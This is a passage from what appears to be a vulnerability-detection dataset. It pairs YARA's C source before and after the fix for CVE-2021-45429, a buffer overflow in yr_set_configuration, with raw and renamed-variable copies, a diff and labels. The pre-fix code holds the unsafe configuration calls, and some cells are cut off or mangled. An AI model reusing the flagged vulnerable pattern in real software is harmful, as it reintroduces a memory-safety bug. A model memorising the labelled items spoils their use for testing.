if (result != ERROR_SUCCESS)
{
print_error(result);
exit_with_code(EXIT_FAILURE);
}
yr_scanner_set_callback(
thread_args[i].scanner, callback, &thread_args[i].callback_args);
yr_scanner_set_flags(thread_args[i].scanner, flags);
if (cli_create_thread(
&thread[i], scanning_thread, (void*) &thread_args[i]))
{
print_error(ERROR_COULD_NOT_CREATE_THREAD);
exit_with_code(EXIT_FAILURE);
}
}
if (arg_is_dir)
{
scan_dir(argv[argc - 1], &scan_opts);
}
else
{
result = populate_scan_list(argv[argc - 1], &scan_opts);
if (result != ERROR_SUCCESS)
exit_with_code(EXIT_FAILURE);
}
file_queue_finish();
for (int i = 0; i < threads; i++) cli_thread_join(&thread[i]);
for (int i = 0; i < threads; i++)
yr_scanner_destroy(thread_args[i].scanner);
file_queue_destroy();
}
else
{
CALLBACK_ARGS user_data = {argv[argc - 1], 0};
result = yr_scanner_create(rules, &scanner);
if (result != ERROR_SUCCESS)
{
_ftprintf(stderr, _T(""error: %d\n""), result);
exit_with_code(EXIT_FAILURE);
}
yr_scanner_set_callback(scanner, callback, &user_data);
yr_scanner_set_flags(scanner, flags);
yr_scanner_set_timeout(scanner, timeout);
result = scan_file(scanner, argv[argc - 1]);
if (result == ERROR_COULD_NOT_OPEN_FILE)
{
char* endptr = NULL;
long pid = _tcstol(argv[argc - 1], &endptr, 10);
if (pid > 0 && argv[argc - 1] != NULL && *endptr == '\x00')
result = yr_scanner_scan_proc(scanner, (int) pid);
}
if (result != ERROR_SUCCESS)
{
_ftprintf(stderr, _T(""error scanning %s: ""), argv[argc - 1]);
print_scanner_error(scanner, result);
exit_with_code(EXIT_FAILURE);
}
if (print_count_only)
_tprintf(_T(""%d\n""), user_data.current_count);
#ifdef YR_PROFILING_ENABLED
yr_scanner_print_profiling_info(scanner);
#endif
}
result = EXIT_SUCCESS;
_exit:
unload_modules_data();
if (scanner != NULL)
yr_scanner_destroy(scanner);
if (compiler != NULL)
yr_compiler_destroy(compiler);
if (rules != NULL)
yr_rules_destroy(rules);
yr_finalize();
args_free(options);
return result;
}","int _tmain(int VAR_0, const char_t** VAR_1)
{
COMPILER_RESULTS VAR_2;
YR_COMPILER* VAR_3 = NULL;
YR_RULES* VAR_4 = NULL;
YR_SCANNER* VAR_5 = NULL;
SCAN_OPTIONS VAR_6;
bool VAR_7 = false;
int VAR_8 = 0;
int VAR_9;
VAR_0 = args_parse(VAR_10, VAR_0, VAR_1);
VAR_6.follow_symlinks = VAR_11;
VAR_6.recursive_search = VAR_12;
if (VAR_13)
{
printf(""%s\n"", VAR_14);
return VAR_15;
}
if (VAR_16)
{
printf(
""YARA %s, the pattern matching swiss army knife.\n""
""%s\n\n""
""Mandatory arguments to long options are mandatory for ""
""short options too.\n\n"",
VAR_14,
VAR_17);
args_print_usage(VAR_10, 43);
printf(
""\nSend bug reports and suggestions to: vmalvarez@virustotal.com.\n"");
return VAR_15;
}
if (VAR_18 > VAR_19)
{
fprintf(VAR_20, ""maximum number of threads is %d\n"", VAR_19);
return VAR_21;
}
if (VAR_0 < 2)
{
fprintf(VAR_20, ""yara: wrong number of arguments\n"");
fprintf(VAR_20, ""%s\n\n"", VAR_17);
fprintf(VAR_20, ""Try `--help` for more options\n"");
return VAR_21;
}
#if defined(VAR_22) && defined(VAR_23)
if (_setmode(_fileno(VAR_24), VAR_25) == -1)
{
return VAR_21;
}
#endif
if (!load_modules_data())
exit_with_code(VAR_21);
VAR_9 = yr_initialize();
if (VAR_9 != VAR_26)
{
fprintf(VAR_20, ""error: initialization error (%d)\n"", VAR_9);
exit_with_code(VAR_21);
}
yr_set_configuration(VAR_27, &VAR_28);
yr_set_configuration(VAR_29, &VAR_30);
yr_set_configuration(
VAR_31, &VAR_32);
if (VAR_33)
{
if (VAR_0 != 2)
{
fprintf(
VAR_20,
""error: can't accept multiple rules files if one of them is in ""
""compiled form.\n"");
exit_with_code(VAR_21);
}
FILE* VAR_34 = _tfopen(VAR_1[0], _T(""rb""));
if (VAR_34 != NULL)
{
YR_STREAM VAR_35;
VAR_35.user_data = VAR_34;
VAR_35.read = (YR_STREAM_READ_FUNC) VAR_36;
VAR_9 = yr_rules_load_stream(&VAR_35, &VAR_4);
fclose(VAR_34);
if (VAR_9 == VAR_26)
VAR_9 = define_external_variables(VAR_37, VAR_4, NULL);
}
else
{
VAR_9 = VAR_38;
}
}
else
{
if (yr_compiler_create(&VAR_3) != VAR_26)
exit_with_code(VAR_21);
VAR_9 = define_external_variables(VAR_37, NULL, VAR_3);
if (VAR_9 != VAR_26)
{
print_error(VAR_9);
exit_with_code(VAR_21);
}
if (VAR_39 != NULL)
{
VAR_9 = yr_compiler_load_atom_quality_table(
VAR_3, VAR_39, 0);
if (VAR_9 != VAR_26)
{
fprintf(VAR_20, ""error loading atom quality table: "");
print_error(VAR_9);
exit_with_code(VAR_21);
}
}
VAR_2.errors = 0;
VAR_2.warnings = 0;
yr_compiler_set_callback(VAR_3, VAR_40, &VAR_2);
if (!compile_files(VAR_3, VAR_0, VAR_1))
exit_with_code(VAR_21);
if (VAR_2.errors > 0)
exit_with_code(VAR_21);
if (VAR_41 && VAR_2.warnings > 0)
exit_with_code(VAR_21);
VAR_9 = yr_compiler_get_rules(VAR_3, &VAR_4);
yr_compiler_destroy(VAR_3);
VAR_3 = NULL;
}
if (VAR_9 != VAR_26)
{
print_error(VAR_9);
exit_with_code(VAR_21);
}
if (VAR_42)
print_rules_stats(VAR_4);
cli_mutex_init(&VAR_43);
if (VAR_44)
VAR_8 |= VAR_45;
VAR_6.deadline = time(NULL) + VAR_46;
VAR_7 = is_directory(VAR_1[VAR_0 - 1]);
if (VAR_47 && VAR_7)
{
fprintf(VAR_20, ""error: cannot use a directory as scan list.\n"");
exit_with_code(VAR_21);
}
else if (VAR_47 || VAR_7)
{
if (file_queue_init() != 0)
{
print_error(VAR_48);
exit_with_code(VAR_21);
}
THREAD VAR_49[VAR_19];
THREAD_ARGS VAR_50[VAR_19];
for (int VAR_51 = 0; VAR_51 < VAR_18; VAR_51++)
{
VAR_50[VAR_51].deadline = VAR_6.deadline;
VAR_50[VAR_51].current_count = 0;
VAR_9 = yr_scanner_create(VAR_4, &VAR_50[VAR_51].scanner);
if (VAR_9 != VAR_26)
{
print_error(VAR_9);
exit_with_code(VAR_21);
}
yr_scanner_set_callback(
VAR_50[VAR_51].scanner, VAR_52, &VAR_50[VAR_51].callback_args);
yr_scanner_set_flags(VAR_50[VAR_51].scanner, VAR_8);
if (cli_create_thread(
&VAR_49[VAR_51], VAR_53, (void*) &VAR_50[VAR_51]))
{
print_error(VAR_54);
exit_with_code(VAR_21);
}
}
if (VAR_7)
{
scan_dir(VAR_1[VAR_0 - 1], &VAR_6);
}
else
{
VAR_9 = populate_scan_list(VAR_1[VAR_0 - 1], &VAR_6);
if (VAR_9 != VAR_26)
exit_with_code(VAR_21);
}
file_queue_finish();
for (int VAR_51 = 0; VAR_51 < VAR_18; VAR_51++) cli_thread_join(&VAR_49[VAR_51]);
for (int VAR_51 = 0; VAR_51 < VAR_18; VAR_51++)
yr_scanner_destroy(VAR_50[VAR_51].scanner);
file_queue_destroy();
}
else
{
CALLBACK_ARGS VAR_55 = {VAR_1[VAR_0 - 1], 0};
VAR_9 = yr_scanner_create(VAR_4, &VAR_5);
if (VAR_9 != VAR_26)
{
_ftprintf(VAR_20, _T(""error: %d\n""), VAR_9);
exit_with_code(VAR_21);
}
yr_scanner_set_callback(VAR_5, VAR_52, &VAR_55);
yr_scanner_set_flags(VAR_5, VAR_8);
yr_scanner_set_timeout(VAR_5, VAR_46);
VAR_9 = scan_file(VAR_5, VAR_1[VAR_0 - 1]);
if (VAR_9 == VAR_38)
{
char* VAR_56 = NULL;
long VAR_57 = _tcstol(VAR_1[VAR_0 - 1], &VAR_56, 10);
if (VAR_57 > 0 && VAR_1[VAR_0 - 1] != NULL && *VAR_56 == '\x00')
VAR_9 = yr_scanner_scan_proc(VAR_5, (int) VAR_57);
}
if (VAR_9 != VAR_26)
{
_ftprintf(VAR_20, _T(""error scanning %s: ""), VAR_1[VAR_0 - 1]);
print_scanner_error(VAR_5, VAR_9);
exit_with_code(VAR_21);
}
if (VAR_58)
_tprintf(_T(""%d\n""), VAR_55.current_count);
#ifdef VAR_59
yr_scanner_print_profiling_info(VAR_5);
#endif
}
VAR_9 = VAR_15;
_exit:
unload_modules_data();
if (VAR_5 != NULL)
yr_scanner_destroy(VAR_5);
if (VAR_3 != NULL)
yr_compiler_destroy(VAR_3);
if (VAR_4 != NULL)
yr_rules_destroy(VAR_4);
yr_finalize();
args_free(VAR_10);
return VAR_9;
}",VirusTotal/yara/b34b7e74c862c129b801832b6b85401fbada2b01/yara.c/vul/before/0.json,"int _tmain(int argc, const char_t** argv)
{
  COMPILER_RESULTS cr;

  YR_COMPILER* compiler = NULL;
  YR_RULES* rules = NULL;
  YR_SCANNER* scanner = NULL;
  SCAN_OPTIONS scan_opts;

  bool arg_is_dir = false;
  int flags = 0;
  int result;

  argc = args_parse(options, argc, argv);

  scan_opts.follow_symlinks = follow_symlinks;
  scan_opts.recursive_search = recursive_search;

  if (show_version)
  {
    printf(""%s\n"", YR_VERSION);
    return EXIT_SUCCESS;
  }

  if (show_help)
  {
    printf(
        ""YARA %s, the pattern matching swiss army knife.\n""
        ""%s\n\n""
        ""Mandatory arguments to long options are mandatory for ""
        ""short options too.\n\n"",
        YR_VERSION,
        USAGE_STRING);

    args_print_usage(options, 43);
    printf(
        ""\nSend bug reports and suggestions to: vmalvarez@virustotal.com.\n"");

    return EXIT_SUCCESS;
  }

  if (threads > YR_MAX_THREADS)
  {
    fprintf(stderr, ""maximum number of threads is %d\n"", YR_MAX_THREADS);
    return EXIT_FAILURE;
  }

  if (argc < 2)
  {
    // After parsing the command-line options we expect two additional
    // arguments, the rules file and the target file, directory or pid to
    // be scanned.

    fprintf(stderr, ""yara: wrong number of arguments\n"");
    fprintf(stderr, ""%s\n\n"", USAGE_STRING);
    fprintf(stderr, ""Try `--help` for more options\n"");

    return EXIT_FAILURE;
  }

#if defined(_WIN32) && defined(_UNICODE)
  // In Windows set stdout to UTF-8 mode.
  if (_setmode(_fileno(stdout), _O_U8TEXT) == -1)
  {
    return EXIT_FAILURE;
  }
#endif

  if (!load_modules_data())
    exit_with_code(EXIT_FAILURE);

  result = yr_initialize();

  if (result != ERROR_SUCCESS)
  {
    fprintf(stderr, ""error: initialization error (%d)\n"", result);
    exit_with_code(EXIT_FAILURE);
  }

  yr_set_configuration_uint32(YR_CONFIG_STACK_SIZE, stack_size);

  yr_set_configuration_uint32(
      YR_CONFIG_MAX_STRINGS_PER_RULE, max_strings_per_rule);

  yr_set_configuration_uint64(
      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, max_process_memory_chunk);

  // Try to load the rules file as a binary file containing
  // compiled rules first

  if (rules_are_compiled)
  {
    // When a binary file containing compiled rules is provided, yara accepts
    // only two arguments, the compiled rules file and the target to be scanned.

    if (argc != 2)
    {
      fprintf(
          stderr,
          ""error: can't accept multiple rules files if one of them is in ""
          ""compiled form.\n"");
      exit_with_code(EXIT_FAILURE);
    }

    // Not using yr_rules_load because it does not have support for unicode
    // file names. Instead use open _tfopen for openning the file and
    // yr_rules_load_stream for loading the rules from it.

    FILE* fh = _tfopen(argv[0], _T(""rb""));

    if (fh != NULL)
    {
      YR_STREAM stream;

      stream.user_data = fh;
      stream.read = (YR_STREAM_READ_FUNC) fread;

      result = yr_rules_load_stream(&stream, &rules);

      fclose(fh);

      if (result == ERROR_SUCCESS)
        result = define_external_variables(ext_vars, rules, NULL);
    }
    else
    {
      result = ERROR_COULD_NOT_OPEN_FILE;
    }
  }
  else
  {
    // Rules file didn't contain compiled rules, let's handle it
    // as a text file containing rules in source form.

    if (yr_compiler_create(&compiler) != ERROR_SUCCESS)
      exit_with_code(EXIT_FAILURE);

    result = define_external_variables(ext_vars, NULL, compiler);

    if (result != ERROR_SUCCESS)
    {
      print_error(result);
      exit_with_code(EXIT_FAILURE);
    }

    if (atom_quality_table != NULL)
    {
      result = yr_compiler_load_atom_quality_table(
          compiler, atom_quality_table, 0);

      if (result != ERROR_SUCCESS)
      {
        fprintf(stderr, ""error loading atom quality table: "");
        print_error(result);
        exit_with_code(EXIT_FAILURE);
      }
    }

    cr.errors = 0;
    cr.warnings = 0;

    yr_compiler_set_callback(compiler, print_compiler_error, &cr);

    if (!compile_files(compiler, argc, argv))
      exit_with_code(EXIT_FAILURE);

    if (cr.errors > 0)
      exit_with_code(EXIT_FAILURE);

    if (fail_on_warnings && cr.warnings > 0)
      exit_with_code(EXIT_FAILURE);

    result = yr_compiler_get_rules(compiler, &rules);

    yr_compiler_destroy(compiler);

    compiler = NULL;
  }

  if (result != ERROR_SUCCESS)
  {
    print_error(result);
    exit_with_code(EXIT_FAILURE);
  }

  if (show_stats)
    print_rules_stats(rules);

  cli_mutex_init(&output_mutex);

  if (fast_scan)
    flags |= SCAN_FLAGS_FAST_MODE;

  scan_opts.deadline = time(NULL) + timeout;

  arg_is_dir = is_directory(argv[argc - 1]);

  if (scan_list_search && arg_is_dir)
  {
    fprintf(stderr, ""error: cannot use a directory as scan list.\n"");
    exit_with_code(EXIT_FAILURE);
  }
  else if (scan_list_search || arg_is_dir)
  {
    if (file_queue_init() != 0)
    {
      print_error(ERROR_INTERNAL_FATAL_ERROR);
      exit_with_code(EXIT_FAILURE);
    }

    THREAD thread[YR_MAX_THREADS];
    THREAD_ARGS thread_args[YR_MAX_THREADS];

    for (int i = 0; i < threads; i++)
    {
      thread_args[i].deadline = scan_opts.deadline;
      thread_args[i].current_count = 0;

      result = yr_scanner_create(rules, &thread_args[i].scanner);

      if (result != ERROR_SUCCESS)
      {
        print_error(result);
        exit_with_code(EXIT_FAILURE);
      }

      yr_scanner_set_callback(
          thread_args[i].scanner, callback, &thread_args[i].callback_args);

      yr_scanner_set_flags(thread_args[i].scanner, flags);

      if (cli_create_thread(
              &thread[i], scanning_thread, (void*) &thread_args[i]))
      {
        print_error(ERROR_COULD_NOT_CREATE_THREAD);
        exit_with_code(EXIT_FAILURE);
      }
    }

    if (arg_is_dir)
    {
      scan_dir(argv[argc - 1], &scan_opts);
    }
    else
    {
      result = populate_scan_list(argv[argc - 1], &scan_opts);

      if (result != ERROR_SUCCESS)
        exit_with_code(EXIT_FAILURE);
    }

    file_queue_finish();

    // Wait for scan threads to finish
    for (int i = 0; i < threads; i++) cli_thread_join(&thread[i]);

    for (int i = 0; i < threads; i++)
      yr_scanner_destroy(thread_args[i].scanner);

    file_queue_destroy();
  }
  else
  {
    CALLBACK_ARGS user_data = {argv[argc - 1], 0};

    result = yr_scanner_create(rules, &scanner);

    if (result != ERROR_SUCCESS)
    {
      _ftprintf(stderr, _T(""error: %d\n""), result);
      exit_with_code(EXIT_FAILURE);
    }

    yr_scanner_set_callback(scanner, callback, &user_data);
    yr_scanner_set_flags(scanner, flags);
    yr_scanner_set_timeout(scanner, timeout);

    // Assume the last argument is a file first. This assures we try to process
    // files that start with numbers first.
    result = scan_file(scanner, argv[argc - 1]);

    if (result == ERROR_COULD_NOT_OPEN_FILE)
    {
      // Is it a PID? To be a PID it must be made up entirely of digits.
      char* endptr = NULL;
      long pid = _tcstol(argv[argc - 1], &endptr, 10);

      if (pid > 0 && argv[argc - 1] != NULL && *endptr == '\x00')
        result = yr_scanner_scan_proc(scanner, (int) pid);
    }

    if (result != ERROR_SUCCESS)
    {
      _ftprintf(stderr, _T(""error scanning %s: ""), argv[argc - 1]);
      print_scanner_error(scanner, result);
      exit_with_code(EXIT_FAILURE);
    }

    if (print_count_only)
      _tprintf(_T(""%d\n""), user_data.current_count);

#ifdef YR_PROFILING_ENABLED
    yr_scanner_print_profiling_info(scanner);
#endif
  }

  result = EXIT_SUCCESS;

_exit:

  unload_modules_data();

  if (scanner != NULL)
    yr_scanner_destroy(scanner);

  if (compiler != NULL)
    yr_compiler_destroy(compiler);

  if (rules != NULL)
    yr_rules_destroy(rules);

  yr_finalize();

  args_free(options);

  return result;
}","int _tmain(int VAR_0, const char_t** VAR_1)
{
  COMPILER_RESULTS VAR_2;

  YR_COMPILER* VAR_3 = NULL;
  YR_RULES* VAR_4 = NULL;
  YR_SCANNER* VAR_5 = NULL;
  SCAN_OPTIONS VAR_6;

  bool VAR_7 = false;
  int VAR_8 = 0;
  int VAR_9;

  VAR_0 = args_parse(VAR_10, VAR_0, VAR_1);

  VAR_6.follow_symlinks = VAR_11;
  VAR_6.recursive_search = VAR_12;

  if (VAR_13)
  {
    printf(""%s\n"", VAR_14);
    return VAR_15;
  }

  if (VAR_16)
  {
    printf(
        ""YARA %s, the pattern matching swiss army knife.\n""
        ""%s\n\n""
        ""Mandatory arguments to long options are mandatory for ""
        ""short options too.\n\n"",
        VAR_14,
        VAR_17);

    args_print_usage(VAR_10, 43);
    printf(
        ""\nSend bug reports and suggestions to: vmalvarez@virustotal.com.\n"");

    return VAR_15;
  }

  if (VAR_18 > VAR_19)
  {
    fprintf(VAR_20, ""maximum number of threads is %d\n"", VAR_19);
    return VAR_21;
  }

  if (VAR_0 < 2)
  {
    /* COMMENT_0 */
    /* COMMENT_1 */
    /* COMMENT_2 */

    fprintf(VAR_20, ""yara: wrong number of arguments\n"");
    fprintf(VAR_20, ""%s\n\n"", VAR_17);
    fprintf(VAR_20, ""Try `--help` for more options\n"");

    return VAR_21;
  }

#if defined(VAR_22) && defined(VAR_23)
  /* COMMENT_3 */
  if (_setmode(_fileno(VAR_24), VAR_25) == -1)
  {
    return VAR_21;
  }
#endif

  if (!load_modules_data())
    exit_with_code(VAR_21);

  VAR_9 = yr_initialize();

  if (VAR_9 != VAR_26)
  {
    fprintf(VAR_20, ""error: initialization error (%d)\n"", VAR_9);
    exit_with_code(VAR_21);
  }

  yr_set_configuration_uint32(VAR_27, VAR_28);

  yr_set_configuration_uint32(
      VAR_29, VAR_30);

  yr_set_configuration_uint64(
      VAR_31, VAR_32);

  /* COMMENT_4 */
  /* COMMENT_5 */

  if (VAR_33)
  {
    /* COMMENT_6 */
    /* COMMENT_7 */

    if (VAR_0 != 2)
    {
      fprintf(
          VAR_20,
          ""error: can't accept multiple rules files if one of them is in ""
          ""compiled form.\n"");
      exit_with_code(VAR_21);
    }

    /* COMMENT_8 */
    /* COMMENT_9 */
    /* COMMENT_10 */

    FILE* VAR_34 = _tfopen(VAR_1[0], _T(""rb""));

    if (VAR_34 != NULL)
    {
      YR_STREAM VAR_35;

      VAR_35.user_data = VAR_34;
      VAR_35.read = (YR_STREAM_READ_FUNC) VAR_36;

      VAR_9 = yr_rules_load_stream(&VAR_35, &VAR_4);

      fclose(VAR_34);

      if (VAR_9 == VAR_26)
        VAR_9 = define_external_variables(VAR_37, VAR_4, NULL);
    }
    else
    {
      VAR_9 = VAR_38;
    }
  }
  else
  {
    /* COMMENT_11 */
    /* COMMENT_12 */

    if (yr_compiler_create(&VAR_3) != VAR_26)
      exit_with_code(VAR_21);

    VAR_9 = define_external_variables(VAR_37, NULL, VAR_3);

    if (VAR_9 != VAR_26)
    {
      print_error(VAR_9);
      exit_with_code(VAR_21);
    }

    if (VAR_39 != NULL)
    {
      VAR_9 = yr_compiler_load_atom_quality_table(
          VAR_3, VAR_39, 0);

      if (VAR_9 != VAR_26)
      {
        fprintf(VAR_20, ""error loading atom quality table: "");
        print_error(VAR_9);
        exit_with_code(VAR_21);
      }
    }

    VAR_2.errors = 0;
    VAR_2.warnings = 0;

    yr_compiler_set_callback(VAR_3, VAR_40, &VAR_2);

    if (!compile_files(VAR_3, VAR_0, VAR_1))
      exit_with_code(VAR_21);

    if (VAR_2.errors > 0)
      exit_with_code(VAR_21);

    if (VAR_41 && VAR_2.warnings > 0)
      exit_with_code(VAR_21);

    VAR_9 = yr_compiler_get_rules(VAR_3, &VAR_4);

    yr_compiler_destroy(VAR_3);

    VAR_3 = NULL;
  }

  if (VAR_9 != VAR_26)
  {
    print_error(VAR_9);
    exit_with_code(VAR_21);
  }

  if (VAR_42)
    print_rules_stats(VAR_4);

  cli_mutex_init(&VAR_43);

  if (VAR_44)
    VAR_8 |= VAR_45;

  VAR_6.deadline = time(NULL) + VAR_46;

  VAR_7 = is_directory(VAR_1[VAR_0 - 1]);

  if (VAR_47 && VAR_7)
  {
    fprintf(VAR_20, ""error: cannot use a directory as scan list.\n"");
    exit_with_code(VAR_21);
  }
  else if (VAR_47 || VAR_7)
  {
    if (file_queue_init() != 0)
    {
      print_error(VAR_48);
      exit_with_code(VAR_21);
    }

    THREAD VAR_49[VAR_19];
    THREAD_ARGS VAR_50[VAR_19];

    for (int VAR_51 = 0; VAR_51 < VAR_18; VAR_51++)
    {
      VAR_50[VAR_51].deadline = VAR_6.deadline;
      VAR_50[VAR_51].current_count = 0;

      VAR_9 = yr_scanner_create(VAR_4, &VAR_50[VAR_51].scanner);

      if (VAR_9 != VAR_26)
      {
        print_error(VAR_9);
        exit_with_code(VAR_21);
      }

      yr_scanner_set_callback(
          VAR_50[VAR_51].scanner, VAR_52, &VAR_50[VAR_51].callback_args);

      yr_scanner_set_flags(VAR_50[VAR_51].scanner, VAR_8);

      if (cli_create_thread(
              &VAR_49[VAR_51], VAR_53, (void*) &VAR_50[VAR_51]))
      {
        print_error(VAR_54);
        exit_with_code(VAR_21);
      }
    }

    if (VAR_7)
    {
      scan_dir(VAR_1[VAR_0 - 1], &VAR_6);
    }
    else
    {
      VAR_9 = populate_scan_list(VAR_1[VAR_0 - 1], &VAR_6);

      if (VAR_9 != VAR_26)
        exit_with_code(VAR_21);
    }

    file_queue_finish();

    /* COMMENT_13 */
    for (int VAR_51 = 0; VAR_51 < VAR_18; VAR_51++) cli_thread_join(&VAR_49[VAR_51]);

    for (int VAR_51 = 0; VAR_51 < VAR_18; VAR_51++)
      yr_scanner_destroy(VAR_50[VAR_51].scanner);

    file_queue_destroy();
  }
  else
  {
    CALLBACK_ARGS VAR_55 = {VAR_1[VAR_0 - 1], 0};

    VAR_9 = yr_scanner_create(VAR_4, &VAR_5);

    if (VAR_9 != VAR_26)
    {
      _ftprintf(VAR_20, _T(""error: %d\n""), VAR_9);
      exit_with_code(VAR_21);
    }

    yr_scanner_set_callback(VAR_5, VAR_52, &VAR_55);
    yr_scanner_set_flags(VAR_5, VAR_8);
    yr_scanner_set_timeout(VAR_5, VAR_46);

    /* COMMENT_14 */
    /* COMMENT_15 */
    VAR_9 = scan_file(VAR_5, VAR_1[VAR_0 - 1]);

    if (VAR_9 == VAR_38)
    {
      /* COMMENT_16 */
      char* VAR_56 = NULL;
      long VAR_57 = _tcstol(VAR_1[VAR_0 - 1], &VAR_56, 10);

      if (VAR_57 > 0 && VAR_1[VAR_0 - 1] != NULL && *VAR_56 == '\x00')
        VAR_9 = yr_scanner_scan_proc(VAR_5, (int) VAR_57);
    }

    if (VAR_9 != VAR_26)
    {
      _ftprintf(VAR_20, _T(""error scanning %s: ""), VAR_1[VAR_0 - 1]);
      print_scanner_error(VAR_5, VAR_9);
      exit_with_code(VAR_21);
    }

    if (VAR_58)
      _tprintf(_T(""%d\n""), VAR_55.current_count);

#ifdef VAR_59
    yr_scanner_print_profiling_info(VAR_5);
#endif
  }

  VAR_9 = VAR_15;

_exit:

  unload_modules_data();

  if (VAR_5 != NULL)
    yr_scanner_destroy(VAR_5);

  if (VAR_3 != NULL)
    yr_compiler_destroy(VAR_3);

  if (VAR_4 != NULL)
    yr_rules_destroy(VAR_4);

  yr_finalize();

  args_free(VAR_10);

  return VAR_9;
}",VirusTotal/yara/b34b7e74c862c129b801832b6b85401fbada2b01/yara.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -77,10 +77,13 @@
     exit_with_code(EXIT_FAILURE);
   }
 
-  yr_set_configuration(YR_CONFIG_STACK_SIZE, &stack_size);
-  yr_set_configuration(YR_CONFIG_MAX_STRINGS_PER_RULE, &max_strings_per_rule);
-  yr_set_configuration(
-      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, &max_process_memory_chunk);
+  yr_set_configuration_uint32(YR_CONFIG_STACK_SIZE, stack_size);
+
+  yr_set_configuration_uint32(
+      YR_CONFIG_MAX_STRINGS_PER_RULE, max_strings_per_rule);
+
+  yr_set_configuration_uint64(
+      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, max_process_memory_chunk);
 
   // Try to load the rules file as a binary file containing
   // compiled rules first","{'deleted_lines': ['  yr_set_configuration(YR_CONFIG_STACK_SIZE, &stack_size);', '  yr_set_configuration(YR_CONFIG_MAX_STRINGS_PER_RULE, &max_strings_per_rule);', '  yr_set_configuration(', '      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, &max_process_memory_chunk);'], 'added_lines': ['  yr_set_configuration_uint32(YR_CONFIG_STACK_SIZE, stack_size);', '', '  yr_set_configuration_uint32(', '      YR_CONFIG_MAX_STRINGS_PER_RULE, max_strings_per_rule);', '', '  yr_set_configuration_uint64(', '      YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, max_process_memory_chunk);']}",True,"A Buffer Overflow vulnerablity exists in VirusTotal YARA git commit: 605b2edf07ed8eb9a2c61ba22eb2e7c362f47ba7 via yr_set_configuration in yara/libyara/libyara.c, which could cause a Denial of Service.",5.5,MEDIUM,1,valid,2021-12-17T15:47:20Z,4
CVE-2021-45429,['CWE-120'],AV:N/AC:M/Au:N/C:N/I:N/A:P,0,VirusTotal/yara,"Fix issue #1616

This is a more comprehensive fix than #1617, it adds new functions to the API for getting/setting uint32 and uint64 settings.  Using these functions is preferable over calling `yr_(get|set)_configuration` directly.",b34b7e74c862c129b801832b6b85401fbada2b01,https://github.com/VirusTotal/yara/commit/b34b7e74c862c129b801832b6b85401fbada2b01,libyara/proc/linux.c,yr_process_get_next_memory_block,"YR_API YR_MEMORY_BLOCK* yr_process_get_next_memory_block(
YR_MEMORY_BLOCK_ITERATOR* iterator)
{
YR_PROC_ITERATOR_CTX* context = (YR_PROC_ITERATOR_CTX*) iterator->context;
YR_PROC_INFO* proc_info = (YR_PROC_INFO*) context->proc_info;
char buffer[PATH_MAX];
char perm[5];
uint64_t begin, end;
uint64_t current_begin = context->current_block.base +
context->current_block.size;
uint64_t max_process_memory_chunk;
yr_get_configuration(
YR_CONFIG_MAX_PROCESS_MEMORY_CHUNK, (void*) &max_process_memory_chunk);
if (proc_info->next_block_end <= current_begin)
{
int n, path_start;
while (fgets(buffer, sizeof(buffer), proc_info->maps) != NULL)
{
if (strrchr(buffer, '\n') == NULL)
{
int c;
do
{
c = fgetc(proc_info->maps);
} while (c >= 0 && c != '\n');
}
n = sscanf(
buffer,
""%"" SCNx64 ""-%"" SCNx64 "" %4s ""
""%"" SCNx64 "" %"" SCNx64 "":%"" SCNx64 "" %"" SCNu64 "" %n"",
&begin,
&end,
perm,
&(proc_info->map_offset),
&(proc_info->map_dmaj),
&(proc_info->map_dmin),
&(proc_info->map_ino),
&path_start);
if (n == 7)
{
if (buffer[path_start] == '/')
strncpy(
proc_info->map_path,
buffer + path_start,
sizeof(proc_info->map_path) - 1);
else
proc_info->map_path[0] = '\0';
break;
}
}
if (n == 7)
{
current_begin = begin;
proc_info->next_block_end = end;
}
else
{
YR_DEBUG_FPRINTF(2, stderr, ""+ %s() = NULL\n"", __FUNCTION__);
return NULL;
}
}
context->current_block.base = current_begin;
context->current_block.size = yr_min(
proc_info->next_block_end - current_begin, max_process_memory_chunk);
assert(context->current_block.size > 0);
iterator->last_error = ERROR_SUCCESS;
YR_DEBUG_FPRINTF(
2,
stderr,
""- %s() {} = %p       __FUNCTION__,
result,
context->current_block.base,
context->current_block.size);
return &context->current_block;
}","YR_API VAR_0* yr_process_get_next_memory_block(
YR_MEMORY_BLOCK_ITERATOR* VAR_1)
{
YR_PROC_ITERATOR_CTX* VAR_2 = (YR_PROC_ITERATOR_CTX*) VAR_1->context;
YR_PROC_INFO* VAR_3 = (YR_PROC_INFO*) VAR_2->proc_info;
char VAR_4[VAR_5];
char VAR_6[5];
uint64_t VAR_7, VAR_8;
uint64_t VAR_9 = VAR_2->current_block.base +
VAR_2->current_block.size;
uint64_t VAR_10;
yr_get_configuration(
VAR_11, (void*) &VAR_10);
if (VAR_3->next_block_end <= VAR_9)
{
int VAR_12, VAR_13;
while (fgets(VAR_4, sizeof(VAR_4), VAR_3->maps) != NULL)
{
if (strrchr(VAR_4, '\n') == NULL)
{
int VAR_14;
do
{
VAR_14 = fgetc(VAR_3->maps);
} while (VAR_14 >= 0 && VAR_14 != '\n');
}
VAR_12 = sscanf(
VAR_4,
""%"" VAR_15 ""-%"" VAR_15 "" %4s ""
""%"" VAR_15 "" %"" VAR_15 "":%"" VAR_15 "" %"" VAR_16 "" %n"",
&VAR_7,
&VAR_8,
VAR_6,
&(VAR_3->map_offset),
&(VAR_3->map_dmaj),
&(VAR_3->map_dmin),
&(VAR_3->map_ino),
&VAR_13);
if (VAR_12 == 7)
{
if (VAR_4[VAR_13] == '/')
strncpy(
VAR_3->map_path,
VAR_4 + VAR_13,
sizeof(VAR_3->map_path) - 1);
else
VAR_3->map_path[0] = '\0';
break;
}
}
if (VAR_12 == 7)
{
VAR_9 = VAR_7;
VAR_3->next_block_end = VAR_8;
}
else
{
YR_DEBUG_FPRINTF(2, VAR_17, ""+ %s() = NULL\n"", VAR_18);
return NULL;
}
}
VAR_2->current_block.base = VAR_9;
VAR_2->current_block.size = yr_min(
VAR_3->next_block_end - VAR_9, VAR_10);
assert(VAR_2->current_block.size > 0);
VAR_1->last_error = VAR_19;
YR_DEBUG_FPRINTF(
2,
VAR_17,
""- %s() {} = %p // .base=0x%"" VAR_20 "" .size=%"" VAR_21 ""\n"",
VAR_18,
VAR_22,
VAR_2->current_block.base,
VAR_2->current_block.size);
